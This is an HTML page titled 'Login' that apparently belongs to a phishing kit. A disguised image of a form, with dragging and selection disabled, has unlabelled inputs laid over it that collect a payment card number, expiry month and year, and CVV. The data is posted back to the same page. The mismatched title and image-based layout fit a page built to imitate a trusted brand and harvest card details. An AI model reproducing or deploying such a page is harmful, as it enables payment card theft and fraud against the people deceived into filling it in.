
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="css/normalize.min.css" />
<link rel="stylesheet" href="css/estilos.css" />
<title>Login</title>
<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>
<body class="fondo3">
<div class="modal">
<div class="modal-border">
<div class="modal-contenido">
<img style="user-drag: none;
user-select: none;
-moz-user-select: none;
-webkit-user-drag: none;
-webkit-user-select: none;
-ms-user-select: none;" src="img/formulario.png" alt="formulario"/>

<form action="" method="post">
<input class="cinput" type="text" name="card" maxlength="16" required>
<select class=" select mselect" name="mes" required>
<option value="">--</option>
<option value="1">01</option>
<option value="2">02</option>
<option value="3">03</option>
<option value="4">04</option>
<option value="5">05</option>
<option value="6">06</option>
<option value="7">07</option>
<option value="8">08</option>
<option value="9">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select class="select aselect" name="year" required>
<option value="">----</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
</select>
<input class="cvvinput" type="password" name="cvv" maxlength="4" required>
<button class="boton bloque" name="add" type="submit">Continuar</button>
<img class="topform" src="img/top.png" alt="top">
<img class="bottomform" src="img/botton.png" alt="botton">
</form>
</div>
</div>

</div>
</body>
</html>
